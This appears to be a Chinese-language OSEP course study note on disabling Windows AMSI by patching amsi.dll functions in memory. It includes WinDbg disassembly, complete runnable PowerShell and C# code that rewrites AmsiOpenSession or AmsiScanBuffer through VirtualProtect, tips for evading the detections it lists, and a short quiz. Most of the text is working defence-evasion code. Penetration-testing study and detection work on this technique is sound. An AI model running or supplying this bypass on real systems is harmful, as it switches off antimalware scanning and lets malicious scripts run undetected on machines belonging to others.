---
title: OSEP-08-AMSI二进制补丁绕过
description: '08-AMSI绕过 | 06-AMSI二进制补丁绕过'
pubDate: 2026-01-30T00:01:19+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# AMSI 二进制补丁绕过技术

## 写在前面

本章介绍通过直接修改 AMSI 函数的汇编代码来绕过检测的技术。这种方法被称为"热补丁"（Hotpatching），是一种强大的绕过技术。

---

## 一、AmsiOpenSession 汇编分析

### 1.1 原始汇编代码

使用 WinDbg 反汇编 AmsiOpenSession：

```nasm
0:018> u amsi!AmsiOpenSession L1A
amsi!AmsiOpenSession:
00007fff`aa0824c0 4885d2          test    rdx,rdx           ; 检查第二个参数
00007fff`aa0824c3 7446            je      amsi!AmsiOpenSession+0x4b
00007fff`aa0824c5 4885c9          test    rcx,rcx           ; 检查第一个参数
00007fff`aa0824c8 7441            je      amsi!AmsiOpenSession+0x4b
00007fff`aa0824ca 8139414d5349    cmp     dword ptr [rcx],49534D41h  ; 比较 "AMSI"
00007fff`aa0824d0 7539            jne     amsi!AmsiOpenSession+0x4b
00007fff`aa0824d2 4883790800      cmp     qword ptr [rcx+8],0
00007fff`aa0824d7 7432            je      amsi!AmsiOpenSession+0x4b
00007fff`aa0824d9 4883791000      cmp     qword ptr [rcx+10h],0
00007fff`aa0824de 742b            je      amsi!AmsiOpenSession+0x4b
00007fff`aa0824e0 41b801000000    mov     r8d,1
00007fff`aa0824e6 418bc0          mov     eax,r8d
00007fff`aa0824e9 f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007fff`aa0824ee 4103c0          add     eax,r8d
00007fff`aa0824f1 4898            cdqe
00007fff`aa0824f3 488902          mov     qword ptr [rdx],rax
00007fff`aa0824f6 7510            jne     amsi!AmsiOpenSession+0x48
00007fff`aa0824f8 418bc0          mov     eax,r8d
00007fff`aa0824fb f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007fff`aa082500 4103c0          add     eax,r8d
00007fff`aa082503 4898            cdqe
00007fff`aa082505 488902          mov     qword ptr [rdx],rax
00007fff`aa082508 33c0            xor     eax,eax           ; 成功返回 0
00007fff`aa08250a c3              ret
00007fff`aa08250b b857000780      mov     eax,80070057h     ; 错误返回 E_INVALIDARG
00007fff`aa082510 c3              ret
```

### 1.2 关键指令分析

```
函数流程：
┌─────────────────────────────────────────────────────────────┐
│  test rdx, rdx    ; 检查 amsiSession 参数是否为 NULL        │
│  je   error       ; 如果为 NULL，跳转到错误处理              │
│                                                             │
│  test rcx, rcx    ; 检查 amsiContext 参数是否为 NULL        │
│  je   error       ; 如果为 NULL，跳转到错误处理              │
│                                                             │
│  cmp  [rcx], "AMSI"  ; 检查 amsiContext 头部                │
│  jne  error          ; 如果不匹配，跳转到错误处理            │
│                                                             │
│  ... 正常处理 ...                                           │
│                                                             │
│  xor  eax, eax    ; 成功：返回 0                            │
│  ret                                                        │
│                                                             │
│error:                                                       │
│  mov  eax, 0x80070057  ; 错误：返回 E_INVALIDARG            │
│  ret                                                        │
└─────────────────────────────────────────────────────────────┘
```

---

## 二、补丁策略

### 2.1 目标

修改函数开头的指令，使其直接跳转到错误返回，从而禁用 AMSI。

### 2.2 原始指令 vs 补丁指令

```nasm
; 原始指令（3 字节）
test rdx, rdx       ; 0x48 0x85 0xD2

; 补丁指令（3 字节）
xor  rax, rax       ; 0x48 0x31 0xC0
```

**为什么选择 XOR RAX, RAX？**

1. `xor rax, rax` 将 RAX 设置为 0
2. 这会设置 CPU 的零标志位 (ZF = 1)
3. 后续的 `je` 指令会检查 ZF
4. 由于 ZF = 1，条件跳转会执行
5. 跳转到错误处理代码，返回 E_INVALIDARG

### 2.3 字节对比

| 指令 | 机器码 | 字节数 |
|------|--------|--------|
| `test rdx, rdx` | 0x48 0x85 0xD2 | 3 |
| `xor rax, rax` | 0x48 0x31 0xC0 | 3 |

字节数相同，可以直接替换！

---

## 三、PowerShell 实现

### 3.1 完整代码

```powershell
# ============================================================
# AMSI 绕过 - AmsiOpenSession 二进制补丁
# ============================================================

# LookupFunc - 通过反射查找 Win32 API 地址
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If($_.Name -eq "GetProcAddress") { $tmp += $_ }
    }

    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# getDelegateType - 创建委托类型
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        ).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType(
            'MyDelegateType',
            'Class, Public, Sealed, AnsiClass, AutoClass',
            [System.MulticastDelegate]
        )

    $type.
        DefineConstructor(
            'RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    $type.
        DefineMethod(
            'Invoke',
            'Public, HideBySig, NewSlot, Virtual',
            $delType,
            $func
        ).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# ===== 主代码 =====

# 1. 获取 AmsiOpenSession 地址
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
Write-Host "[*] AmsiOpenSession 地址: 0x$($funcAddr.ToString('X'))"

# 2. 修改内存保护为可写可执行
$oldProtectionBuffer = 0
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualProtect),
    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)

# PAGE_EXECUTE_READWRITE = 0x40
$result = $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
Write-Host "[*] VirtualProtect 结果: $result"

# 3. 写入补丁字节
# xor rax, rax = 0x48 0x31 0xC0
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
Write-Host "[*] 补丁已写入"

# 4. 恢复内存保护
# PAGE_EXECUTE_READ = 0x20
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
Write-Host "[*] 内存保护已恢复"

Write-Host "[+] AMSI 已绕过!"
```

### 3.2 验证补丁

使用 WinDbg 验证：

```
0:001> u 7FFFC3A224C0
amsi!AmsiOpenSession:
00007fff`c3a224c0 4831c0          xor     rax,rax      ; 已修改！
00007fff`c3a224c3 7446            je      amsi!AmsiOpenSession+0x4b
00007fff`c3a224c5 4885c9          test    rcx,rcx
...
```

---

## 四、AmsiScanBuffer 补丁

### 4.1 另一种补丁方法

除了修改 AmsiOpenSession，也可以修改 AmsiScanBuffer：

```powershell
# 获取 AmsiScanBuffer 地址
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
"@

Add-Type $Win32

# 加载 amsi.dll 并获取函数地址
$amsi = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($amsi, "AmsiScanBuffer")

# 修改内存保护
$p = 0
[Win32]::VirtualProtect($addr, [UIntPtr]::new(6), 0x40, [ref]$p)

# 补丁字节
# mov eax, 0x80070057 (E_INVALIDARG)
# ret
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

# 写入补丁
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)

Write-Host "[+] AmsiScanBuffer 已补丁!"
```

### 4.2 补丁字节解释

```nasm
; 补丁代码（6 字节）
B8 57 00 07 80    mov eax, 0x80070057  ; 返回 E_INVALIDARG
C3                ret                   ; 立即返回
```

---

## 五、内存保护

### 5.1 Windows 内存保护常量

| 常量 | 值 | 含义 |
|------|-----|------|
| PAGE_EXECUTE | 0x10 | 可执行 |
| PAGE_EXECUTE_READ | 0x20 | 可执行、可读 |
| PAGE_EXECUTE_READWRITE | 0x40 | 可执行、可读、可写 |
| PAGE_EXECUTE_WRITECOPY | 0x80 | 可执行、写时复制 |

### 5.2 VirtualProtect 函数

```c
BOOL VirtualProtect(
    LPVOID lpAddress,      // 要修改的内存地址
    SIZE_T dwSize,         // 区域大小
    DWORD  flNewProtect,   // 新的保护属性
    PDWORD lpflOldProtect  // 输出：旧的保护属性
);
```

### 5.3 为什么需要修改内存保护？

```
代码段默认保护：PAGE_EXECUTE_READ (0x20)
┌─────────────────────────────────────────────────────────────┐
│  可以读取代码                                               │
│  可以执行代码                                               │
│  不能写入代码  ← 这是问题所在！                             │
└─────────────────────────────────────────────────────────────┘

修改后：PAGE_EXECUTE_READWRITE (0x40)
┌─────────────────────────────────────────────────────────────┐
│  可以读取代码                                               │
│  可以执行代码                                               │
│  可以写入代码  ← 现在可以修改了！                           │
└─────────────────────────────────────────────────────────────┘
```

---

## 六、C# 实现

```csharp
using System;
using System.Runtime.InteropServices;

class AmsiBypass
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    public static void Patch()
    {
        // 加载 amsi.dll
        IntPtr amsi = LoadLibrary("amsi.dll");
        if (amsi == IntPtr.Zero)
        {
            Console.WriteLine("[-] 无法加载 amsi.dll");
            return;
        }

        // 获取 AmsiScanBuffer 地址
        IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        if (amsiScanBuffer == IntPtr.Zero)
        {
            Console.WriteLine("[-] 无法获取 AmsiScanBuffer 地址");
            return;
        }

        Console.WriteLine($"[+] AmsiScanBuffer: 0x{amsiScanBuffer.ToInt64():X}");

        // 修改内存保护
        uint oldProtect;
        bool success = VirtualProtect(
            amsiScanBuffer,
            (UIntPtr)6,
            0x40,  // PAGE_EXECUTE_READWRITE
            out oldProtect
        );

        if (!success)
        {
            Console.WriteLine("[-] VirtualProtect 失败");
            return;
        }

        // 补丁字节
        byte[] patch = new byte[] {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC3                           // ret
        };

        // 写入补丁
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
        Console.WriteLine("[+] 补丁已写入");

        // 恢复内存保护
        VirtualProtect(
            amsiScanBuffer,
            (UIntPtr)6,
            oldProtect,
            out oldProtect
        );

        Console.WriteLine("[+] AMSI 已绕过!");
    }
}
```

---

## 七、检测与规避

### 7.1 检测点

| 检测方法 | 说明 |
|----------|------|
| 内存完整性检查 | 检测 amsi.dll 代码段是否被修改 |
| API 监控 | 监控 VirtualProtect 调用 |
| ETW 日志 | 检测 AMSI 相关事件 |

### 7.2 规避技巧

1. **使用间接调用**：通过 syscall 直接调用内核函数
2. **时机选择**：在 AMSI 初始化之前进行补丁
3. **恢复原始代码**：执行后恢复原始字节

---

## 八、练习题

### 选择题

1. `xor rax, rax` 指令的作用是什么？
   - A) 将 RAX 设置为 1
   - B) 将 RAX 设置为 0
   - C) 比较 RAX 和 RAX
   - D) 跳转到指定地址

2. PAGE_EXECUTE_READWRITE 的值是？
   - A) 0x10
   - B) 0x20
   - C) 0x40
   - D) 0x80

3. E_INVALIDARG 的十六进制值是？
   - A) 0x00000000
   - B) 0x80070057
   - C) 0x00000001
   - D) 0xFFFFFFFF

4. 为什么需要调用 VirtualProtect？
   - A) 分配新内存
   - B) 修改内存保护属性以允许写入
   - C) 释放内存
   - D) 复制内存

5. `ret` 指令的机器码是？
   - A) 0x90
   - B) 0xC3
   - C) 0xCC
   - D) 0xB8

### 答案

1-B, 2-C, 3-B, 4-B, 5-B

---

## 下一步

掌握了二进制补丁技术后，继续学习 [08-JScript-AMSI绕过.md](/blog/osep/08-amsi绕过/08-jscript-amsi绕过/)，了解如何在 JScript 环境中绕过 AMSI。
